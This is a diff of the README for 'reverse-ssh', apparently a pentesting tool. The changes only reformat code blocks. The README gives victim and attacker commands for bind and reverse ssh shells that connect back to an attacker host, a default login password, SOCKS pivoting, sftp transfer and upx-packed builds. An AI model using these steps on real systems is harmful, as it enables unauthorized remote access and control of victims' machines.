@@ -55,47 +55,47 @@ Compiling additionally requires the following:
 Once `reverse-ssh` is running, you can connect with any username and the default password `letmeinbrudipls`, the ssh key or whatever you specified during compilation.
 After all, it is just an ssh server:
 
-```shell
+```
 # Fully interactive shell access
-ssh -p <RPORT> <RHOST>
+$ ssh -p <RPORT> <RHOST>
 
 # Simple command execution
-ssh -p <RPORT> <RHOST> whoami
+$ ssh -p <RPORT> <RHOST> whoami
 
 # Full-fledged file transfers
-sftp -P <RPORT> <RHOST>
+$ sftp -P <RPORT> <RHOST>
 
 # Dynamic port forwarding as SOCKS proxy on port 9050
-ssh -p <RPORT> -D 9050 <RHOST>
+$ ssh -p <RPORT> -D 9050 <RHOST>
 ```
 
 ### Simple bind shell scenario
 
-```shell
+```
 # Victim
-victim$./reverse-ssh
+$ victim$ ./reverse-ssh
 
 # Attacker (default password: letmeinbrudipls)
-attacker$ssh -p 31337 <LHOST>
+attacker$ ssh -p 31337 <LHOST>
 ```
 
 ### Simple reverse shell scenario
 
-```shell
+```
 # On attacker (get ready to catch the incoming request;
 # can be omitted if you already have an ssh daemon running, e.g. OpenSSH)
 # NOTE: LPORT of 8888 collides with incoming connections; use the flag `-b 8889` or similar on the victim in that case
-attacker$./reverse-ssh -l :<LPORT>
+attacker$ ./reverse-ssh -l :<LPORT>
 
 # On victim
-victim$./reverse-ssh -p <LPORT> <LHOST>
+victim$ ./reverse-ssh -p <LPORT> <LHOST>
 # or in case of an ssh daemon listening at port 22 with user/pass authentication
-victim$./reverse-ssh <USER>@<LHOST>
+victim$ ./reverse-ssh <USER>@<LHOST>
 
 # On attacker (default password: letmeinbrudipls)
-attacker$ssh -p 8888 127.0.0.1
+attacker$ ssh -p 8888 127.0.0.1
 # or with ssh config from below
-attacker$ssh target
+attacker$ ssh target
 ```
 
 In the end it's plain ssh, so you could catch the remote port forwarding call coming from the victim's machine with your openssh daemon listening on port 22.
@@ -104,7 +104,7 @@ Dialling home currently is password only, because I didn't feel like baking a pr
 
 For even more convenience, add the following to your `~/.ssh/config`, copy the [ssh private key](id_reverse-ssh) to `~/.ssh/` and simply call `ssh target` or `sftp target` afterwards:
 
-```shell
+```
 Host target
         Hostname 127.0.0.1
         Port 8888
@@ -116,7 +116,7 @@ Host target
 
 ### Full usage
 
-```shell
+```
 reverseSSH v1.1.0  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>
 
 Usage: reverse-ssh [options] [<user>@]<target>
@@ -157,19 +157,18 @@ Make sure to install the above requirements such as golang in a matching version
 Afterwards, you can compile with `make`, which will create static binaries in `bin`.
 Use `make compressed` to pack the binaries with upx to further reduce their size.
 
-```shell
-make
+```
+$ make
 
 # or to additionally created binaries packed with upx
-make compressed
+$ make compressed
 ```
 
 You can also specify a different default shell (`RS_SHELL`), a personalized password (`RS_PASS`) or an authorized key (`RS_PUB`) when compiling:
 
-```shell
-ssh-keygen -t ed25519 -f id_reverse-ssh
-
-RS_SHELL="/bin/sh" RS_PASS="secret" RS_PUB="$(cat id_reverse-ssh.pub)" make compressed
+```
+$ ssh-keygen -t ed25519 -f id_reverse-ssh
+$ RS_SHELL="/bin/sh" RS_PASS="secret" RS_PUB="$(cat id_reverse-ssh.pub)" make compressed
 ```
 
 ### Building for different operating systems or architectures
@@ -177,8 +176,8 @@ RS_SHELL="/bin/sh" RS_PASS="secret" RS_PUB="$(cat id_reverse-ssh.pub)" make comp
 By default, `reverse-ssh` is compiled for your current OS and architecture, as well as for linux and windows in x86 and x64.
 To compile for other architectures or another OS you can provide environmental variables which match your target, e.g. for linux/arm64:
 
-```shell
-GOARCH=arm64 GOOS=linux make compressed
+```
+$ GOARCH=arm64 GOOS=linux make compressed
 ```
 
 A list of available targets in format `OS/arch` can be obtained via `go tool dist list`.
